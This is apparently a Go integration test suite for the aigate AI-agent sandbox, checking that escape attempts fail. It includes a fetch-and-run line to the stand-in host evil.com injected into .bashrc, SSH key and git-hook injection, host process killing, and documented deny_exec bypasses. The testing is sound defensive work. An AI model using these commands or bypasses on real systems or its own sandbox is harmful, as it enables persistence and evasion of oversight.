package integration

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
)

const escapeTestTimeout = 15 * time.Second

// escapeEnv builds aigate and a minimal throwaway HOME for an escape test
// (skipped with -short).
func escapeEnv(t *testing.T) (bin string, env []string) {
	t.Helper()
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	_, env = sandboxEnv(t)
	return buildBinary(t), env
}

// escapeEnvWith is escapeEnv with the given deny rules (YAML lines) in the
// config, plus a fresh working directory.
func escapeEnvWith(t *testing.T, rules string) (bin string, env []string, work string) {
	t.Helper()
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	home, env := sandboxEnv(t)
	cfg := "group: ai-agents\nuser: ai-runner\n" + rules + "\nallow_net: []\n"
	if err := os.WriteFile(filepath.Join(home, ".aigate", "config.yaml"), []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}
	return buildBinary(t), env, t.TempDir()
}

// runSandboxedCmd runs a command inside the bwrap sandbox and returns
// combined stdout+stderr. Skips if bwrap is not installed. Each invocation
// is capped at escapeTestTimeout to prevent hangs.
func runSandboxedCmd(t *testing.T, bin string, env []string, workDir string, cmdAndArgs ...string) (string, error) {
	t.Helper()
	if _, err := exec.LookPath("bwrap"); err != nil {
		t.Skip("bwrap not found, skipping sandbox escape test")
	}
	ctx, cancel := context.WithTimeout(context.Background(), escapeTestTimeout)
	defer cancel()
	fullArgs := append([]string{"run", "--"}, cmdAndArgs...)
	cmd := exec.CommandContext(ctx, bin, fullArgs...)
	cmd.Env = env
	if workDir != "" {
		cmd.Dir = workDir
	}
	out, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		t.Fatalf("sandboxed command timed out after %s: %s %v", escapeTestTimeout, cmdAndArgs[0], cmdAndArgs[1:])
	}
	return string(out), err
}

// ═══════════════════════════════════════════════════════════════════════════
// PID NAMESPACE: Can we see or signal host processes?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_ProcHostPIDs verifies host PIDs are invisible.
// We get the host test PID, then check it's not in /proc inside the sandbox.
func TestEscape_ProcHostPIDs(t *testing.T) {
	bin, env := escapeEnv(t)

	hostPID := strconv.Itoa(os.Getpid())

	out, err := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"ls /proc/ | grep -E '^[0-9]+$' | sort -n")
	if err != nil {
		t.Fatalf("listing /proc PIDs failed: %v\n%s", err, out)
	}

	for _, line := range strings.Split(strings.TrimSpace(out), "\n") {
		if strings.TrimSpace(line) == hostPID {
			t.Errorf("host PID %s visible inside sandbox — PID namespace broken", hostPID)
		}
	}

	pids := strings.Split(strings.TrimSpace(out), "\n")
	if len(pids) > 10 {
		t.Errorf("sandbox sees %d PIDs (expected <10)", len(pids))
	}
}

// TestEscape_KillHostProcess starts a real process on the host, tries to
// kill it from inside the sandbox, then verifies it survived.
func TestEscape_KillHostProcess(t *testing.T) {
	bin, env := escapeEnv(t)

	// Sacrificial host process
	victim := exec.Command("sleep", "60")
	if err := victim.Start(); err != nil {
		t.Fatalf("start victim: %v", err)
	}
	defer func() {
		victim.Process.Kill() //nolint:errcheck
		victim.Process.Wait() //nolint:errcheck
	}()
	hostPID := strconv.Itoa(victim.Process.Pid)

	// Try to kill it from inside the sandbox — verify the command fails
	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"kill -9 "+hostPID+" 2>&1; echo KILL_EXIT:$?")
	if strings.Contains(out, "KILL_EXIT:0") {
		t.Error("kill command succeeded inside sandbox — PID namespace isolation broken")
	}

	// Double-check: verify victim is still alive on the host
	if err := victim.Process.Signal(syscall.Signal(0)); err != nil {
		t.Error("host process was killed from inside sandbox — PID namespace broken")
	}
}

// TestEscape_ProcCmdlinePID1 verifies PID 1 inside sandbox is NOT host init.
func TestEscape_ProcCmdlinePID1(t *testing.T) {
	bin, env := escapeEnv(t)

	out, err := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"cat /proc/1/cmdline 2>&1 | tr '\\0' ' '")
	trimmed := strings.TrimSpace(out)
	if err != nil || trimmed == "" {
		t.Fatalf("cannot read PID 1 cmdline inside sandbox: err=%v out=%q", err, out)
	}
	// Only the program name: bwrap (PID 1 inside) lists its mount targets,
	// which may include paths like /run/systemd/resolve/….
	if prog := strings.Fields(trimmed)[0]; strings.Contains(prog, "systemd") || prog == "/sbin/init" || prog == "init" {
		t.Errorf("PID 1 is host init (%q) — PID namespace not working", trimmed)
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// FILESYSTEM: Can we write outside the sandbox?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_WriteToUserOwnedPath is the most important filesystem test.
// bwrap uses --bind / / (rw) so the sandboxed process maps to the same UID.
// This test creates a user-owned file outside the workdir and checks if the
// sandbox can tamper with it. If it can, that's a real finding.
func TestEscape_WriteToUserOwnedPath(t *testing.T) {
	bin, env := escapeEnv(t)

	canaryDir := t.TempDir()
	canaryFile := filepath.Join(canaryDir, "canary.txt")
	if err := os.WriteFile(canaryFile, []byte("original"), 0o644); err != nil {
		t.Fatal(err)
	}

	runSandboxedCmd(t, bin, env, "", "sh", "-c", "echo TAMPERED > "+canaryFile+" 2>/dev/null; true") //nolint:errcheck

	data, err := os.ReadFile(canaryFile)
	if err != nil {
		t.Fatalf("reading canary: %v", err)
	}
	if strings.Contains(string(data), "TAMPERED") {
		t.Error("SANDBOX ESCAPE: wrote to user-owned host file outside workdir.\n" +
			"  bwrap --bind / / with --unshare-user still allows writes to user-owned paths.")
	}
}

// TestEscape_WriteToEtc verifies root-owned paths are not writable.
func TestEscape_WriteToEtc(t *testing.T) {
	bin, env := escapeEnv(t)

	runSandboxedCmd(t, bin, env, "", "sh", "-c", //nolint:errcheck
		"echo ESCAPED > /etc/aigate-escape-test 2>/dev/null; true")

	if _, err := os.Stat("/etc/aigate-escape-test"); err == nil {
		t.Error("wrote to /etc on host — filesystem isolation broken")
		os.Remove("/etc/aigate-escape-test") //nolint:errcheck
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// DENY_READ: Can we read denied files through alternative paths?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_DenyReadBypasses: a deny_read file stays unreadable through
// every alternative path to its data — not just the shell's `cat` on its
// own name.
func TestEscape_DenyReadBypasses(t *testing.T) {
	const canary = "API_KEY=sk-deny-read-canary"
	pyReads := `
import os, sys, mmap
target = sys.argv[1]
for name, read in [
    ("open", lambda: open(target).read()),
    ("os.open", lambda: os.read(os.open(target, os.O_RDONLY), 4096).decode()),
    ("mmap", lambda: mmap.mmap(os.open(target, os.O_RDONLY), 0, access=mmap.ACCESS_READ)[:].decode()),
]:
    try:
        print(name + ":" + read().strip())
    except Exception as e:
        print(name + ":BLOCKED:" + str(e))
`
	cases := []struct {
		name string
		// cmd prepares the alternative path (in work) and returns the
		// command that reads through it.
		cmd func(t *testing.T, work, secret string) []string
	}{
		// bwrap binds a marker over the exact path; a hardlink is another
		// path to the same inode.
		{"hardlink", func(t *testing.T, work, secret string) []string {
			link := filepath.Join(work, ".env-hardlink")
			if err := os.Link(secret, link); err != nil {
				t.Skip("hardlinks not supported")
			}
			return []string{"cat", link}
		}},
		{"symlink", func(t *testing.T, work, secret string) []string {
			link := filepath.Join(work, "link")
			if err := os.Symlink(secret, link); err != nil {
				t.Fatal(err)
			}
			return []string{"cat", link}
		}},
		{"/proc/self/root", func(t *testing.T, work, secret string) []string {
			return []string{"sh", "-c", "cat /proc/self/root" + secret + " 2>&1"}
		}},
		// The deny must hold at the VFS level, not only for shell tools.
		{"python open/os.open/mmap", func(t *testing.T, work, secret string) []string {
			return []string{"python3", "-c", pyReads, secret}
		}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			bin, env, work := escapeEnvWith(t, "deny_read: [.env]\ndeny_exec: []")
			secret := filepath.Join(work, ".env")
			if err := os.WriteFile(secret, []byte(canary+"\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			cmd := c.cmd(t, work, secret)
			out, _ := runSandboxedCmd(t, bin, env, work, cmd...)
			if strings.Contains(out, canary) {
				t.Errorf("%s bypassed deny_read:\n%s", c.name, out)
			}
		})
	}
}

// TestEscape_ConfigDirHiddenAllMethods tries multiple methods to read the
// hidden ~/.aigate/config.yaml.
func TestEscape_ConfigDirHiddenAllMethods(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	cfgPath := filepath.Join(tmpHome, ".aigate", "config.yaml")

	methods := []struct {
		name string
		cmd  string
	}{
		{"cat", "cat " + cfgPath},
		{"/proc/self/root", "cat /proc/self/root" + cfgPath},
		{"find+cat", "find " + tmpHome + "/.aigate -name config.yaml -exec cat {} \\;"},
		{"python", "python3 -c \"print(open('" + cfgPath + "').read())\" 2>/dev/null"},
	}

	for _, m := range methods {
		out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c", m.cmd+" 2>&1")
		if strings.Contains(out, "group: ai-agents") {
			t.Errorf("config exposed via %s: %s", m.name, strings.TrimSpace(out))
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// DENY_EXEC: Can we run denied commands through alternative means?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_DenyExecViaPython verifies that deny_exec cannot be bypassed by
// using python's subprocess to invoke the denied command.
func TestEscape_DenyExecViaPython(t *testing.T) {
	bin, env, workDir := escapeEnvWith(t, "deny_read: []\ndeny_exec: [blocked-tool]")
	blockedBin := filepath.Join(workDir, "blocked-tool")
	if err := os.WriteFile(blockedBin, []byte("#!/bin/sh\necho BLOCKED_TOOL_EXECUTED\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	// Try to run blocked binary via python subprocess
	pyScript := `
import subprocess, sys
try:
    r = subprocess.run([sys.argv[1]], capture_output=True, text=True)
    print("STDOUT:" + r.stdout.strip())
    print("STDERR:" + r.stderr.strip())
    print("RC:" + str(r.returncode))
except Exception as e:
    print(f"ERROR:{e}")
`
	out, _ := runSandboxedCmd(t, bin, env, workDir, "python3", "-c", pyScript, blockedBin)
	if strings.Contains(out, "BLOCKED_TOOL_EXECUTED") {
		t.Errorf("python subprocess bypassed deny_exec:\n%s", out)
	}
}

// TestKnownLimitation_DenyExecViaCopy documents that copying a denied binary
// to a new path bypasses deny_exec. This is inherent to path-based blocking.
// Pair deny_exec with deny_read to mitigate: if the file can't be read,
// it can't be copied.
func TestKnownLimitation_DenyExecViaCopy(t *testing.T) {
	t.Skip("known limitation: deny_exec is path-based, copying binary to new path bypasses it")
}

// TestKnownLimitation_DenyExecViaInterpreter documents that `sh ./blocked-tool`
// reads and interprets the script, bypassing the exec overlay. Pair deny_exec
// with deny_read to mitigate.
func TestKnownLimitation_DenyExecViaInterpreter(t *testing.T) {
	t.Skip("known limitation: sh ./script reads the file (deny_read not set), bypassing exec overlay")
}

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE ACCESS: Can we touch dangerous /dev nodes?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_DevMemBlocked verifies /dev/mem, /dev/kmem, /dev/port don't exist.
// bwrap --dev creates a minimal /dev without these dangerous devices.
func TestEscape_DevMemBlocked(t *testing.T) {
	bin, env := escapeEnv(t)

	for _, dev := range []string{"/dev/mem", "/dev/kmem", "/dev/port"} {
		out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
			"test -e "+dev+" && echo EXISTS || echo MISSING")
		if strings.Contains(out, "EXISTS") {
			t.Errorf("%s exists inside sandbox — should not be present with --dev /dev", dev)
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// PRIVILEGE ESCALATION: Can we gain capabilities or modify kernel state?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_PrivilegedOpsFail: kernel-level operations an escape would
// need all fail inside the sandbox.
func TestEscape_PrivilegedOpsFail(t *testing.T) {
	bin, env := escapeEnv(t)
	for _, c := range []struct{ name, script string }{
		{"mknod a block device", "mknod /tmp/test-escape-dev b 8 0"},
		{"mount a filesystem", "mount -t tmpfs tmpfs /mnt"},
		{"chroot", "chroot / /bin/true"},
		{"write /proc/sysrq-trigger", "echo h > /proc/sysrq-trigger"},
		{"nsenter PID 1's network", "nsenter -t 1 -n ip addr"},
	} {
		t.Run(c.name, func(t *testing.T) {
			out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c", c.script+" 2>&1; echo OP_EXIT:$?")
			if !strings.Contains(out, "OP_EXIT:") {
				t.Fatalf("sandbox did not run: %s", out)
			}
			if strings.Contains(out, "OP_EXIT:0") {
				t.Errorf("succeeded inside the sandbox: %s\n%s", c.script, out)
			}
		})
	}
}

// TestEscape_UnshareNestedMountRecover tests that nested unshare + mount
// cannot undo the config dir tmpfs overlay.
func TestEscape_UnshareNestedMountRecover(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	cfgPath := filepath.Join(tmpHome, ".aigate", "config.yaml")

	// Try nested unshare + mount --bind / /mnt to get an un-overlayed view
	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"unshare --user --mount sh -c 'mount --bind / /mnt 2>/dev/null && cat /mnt"+cfgPath+" 2>&1' || true")
	if strings.Contains(out, "group: ai-agents") {
		t.Error("nested unshare recovered hidden config via mount --bind")
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// FD LEAK: Can we find config data through leaked file descriptors?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_FdLeakConfig checks that no open fd in the sandbox points to
// the config directory.
func TestEscape_FdLeakConfig(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	configDir := filepath.Join(tmpHome, ".aigate")

	// Use readlink on each fd to see where they point — no blocking reads
	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"for fd in /proc/self/fd/*; do readlink \"$fd\" 2>/dev/null; done")

	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, configDir) {
			t.Errorf("fd leaks config path: %s", line)
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// READ-ONLY ROOT: Can we write to host paths outside the workdir?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_WriteToBashrc verifies we can't modify ~/.bashrc (a common
// real-world attack: inject commands into shell startup files).
func TestEscape_WriteToBashrc(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	bashrcPath := filepath.Join(tmpHome, ".bashrc")
	if err := os.WriteFile(bashrcPath, []byte("# original\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	runSandboxedCmd(t, bin, env, t.TempDir(), "sh", "-c", //nolint:errcheck
		"echo 'curl http://evil.com/steal | sh' >> "+bashrcPath+" 2>/dev/null; true")

	data, err := os.ReadFile(bashrcPath)
	if err != nil {
		t.Fatalf("reading bashrc: %v", err)
	}
	if strings.Contains(string(data), "evil.com") {
		t.Error("SANDBOX ESCAPE: wrote to ~/.bashrc from sandbox — shell startup injection possible")
	}
}

// TestEscape_WriteToSSHAuthorizedKeys verifies we can't inject SSH keys.
func TestEscape_WriteToSSHAuthorizedKeys(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	sshDir := filepath.Join(tmpHome, ".ssh")
	if err := os.MkdirAll(sshDir, 0o700); err != nil {
		t.Fatal(err)
	}
	akPath := filepath.Join(sshDir, "authorized_keys")
	if err := os.WriteFile(akPath, []byte("# original\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	runSandboxedCmd(t, bin, env, t.TempDir(), "sh", "-c", //nolint:errcheck
		"echo 'ssh-rsa AAAA...attacker' >> "+akPath+" 2>/dev/null; true")

	data, err := os.ReadFile(akPath)
	if err != nil {
		t.Fatalf("reading authorized_keys: %v", err)
	}
	if strings.Contains(string(data), "attacker") {
		t.Error("SANDBOX ESCAPE: wrote to ~/.ssh/authorized_keys — SSH key injection possible")
	}
}

// TestEscape_WriteToGitconfig verifies we can't tamper with git config
// (could inject hooks that run arbitrary code on next git operation).
func TestEscape_WriteToGitconfig(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	gitconfigPath := filepath.Join(tmpHome, ".gitconfig")
	if err := os.WriteFile(gitconfigPath, []byte("[user]\n\tname = original\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	runSandboxedCmd(t, bin, env, t.TempDir(), "sh", "-c", //nolint:errcheck
		"echo '[core]\n\thooksPath = /tmp/evil-hooks' >> "+gitconfigPath+" 2>/dev/null; true")

	data, err := os.ReadFile(gitconfigPath)
	if err != nil {
		t.Fatalf("reading gitconfig: %v", err)
	}
	if strings.Contains(string(data), "evil-hooks") {
		t.Error("SANDBOX ESCAPE: wrote to ~/.gitconfig — git hook injection possible")
	}
}

// TestEscape_WorkdirWriteAllowed verifies the workdir IS writable (sanity check).
// Without this, the sandbox would be useless — AI agents need to write code.
func TestEscape_WorkdirWriteAllowed(t *testing.T) {
	bin, env := escapeEnv(t)

	workDir := t.TempDir()

	outFile := filepath.Join(workDir, "test-output.txt")
	out, _ := runSandboxedCmd(t, bin, env, workDir, "sh", "-c",
		"echo WRITTEN > "+outFile+"; echo WRITE_EXIT:$?")
	if !strings.Contains(out, "WRITE_EXIT:0") {
		t.Fatalf("write command failed inside sandbox: %s", out)
	}

	data, err := os.ReadFile(outFile)
	if err != nil {
		t.Fatalf("workdir should be writable but file wasn't created: %v", err)
	}
	if !strings.Contains(string(data), "WRITTEN") {
		t.Errorf("workdir file content wrong: %q", string(data))
	}
}

// TestEscape_TmpIsolated verifies that /tmp inside the sandbox is isolated
// from the host's /tmp (prevents reading host temp files with secrets).
func TestEscape_TmpIsolated(t *testing.T) {
	bin, env := escapeEnv(t)

	// Write a secret to host's /tmp
	hostTmpFile := filepath.Join(os.TempDir(), "aigate-test-host-secret")
	if err := os.WriteFile(hostTmpFile, []byte("HOST_TMP_SECRET\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	defer os.Remove(hostTmpFile) //nolint:errcheck

	// Try to read it from inside the sandbox
	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"cat "+hostTmpFile+" 2>&1; echo TMP_EXIT:$?")
	if strings.Contains(out, "HOST_TMP_SECRET") {
		t.Error("host /tmp visible inside sandbox — /tmp is not isolated")
	}
}

// TestEscape_DenyExecViaCopyToWorkdir verifies that copying a PATH-based denied
// binary into the writable workdir and running the copy is blocked.
// TestKnownLimitation_DenyExecViaCopyToWorkdir documents that copying a
// denied binary from a ro-bind path to the writable workdir bypasses
// deny_exec. Same root cause as DenyExecViaCopy.
func TestKnownLimitation_DenyExecViaCopyToWorkdir(t *testing.T) {
	t.Skip("known limitation: cp /usr/bin/curl workdir/my-curl bypasses path-based deny_exec")
}
